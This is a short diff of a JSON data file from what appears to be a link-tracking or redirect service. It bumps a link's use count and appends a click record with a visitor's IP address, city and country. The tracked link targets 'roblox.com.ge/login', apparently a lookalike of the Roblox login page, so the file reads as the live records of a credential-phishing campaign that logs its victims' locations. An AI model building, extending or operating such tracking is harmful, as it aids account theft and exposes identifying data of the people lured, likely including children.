@@ -118,7 +118,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1071,
+    "useCount": 1072,
     "createdBy": "admin",
     "clicks": [
       {
@@ -8688,6 +8688,14 @@
         "city": "Long Beach",
         "flag": "🇺🇸",
         "countryCode": "US"
+      },
+      {
+        "timestamp": 1777247922181,
+        "ip": "200.142.184.202",
+        "country": "Brazil",
+        "city": "Itapejara d'Oeste",
+        "flag": "🇧🇷",
+        "countryCode": "BR"
       }
     ]
   },
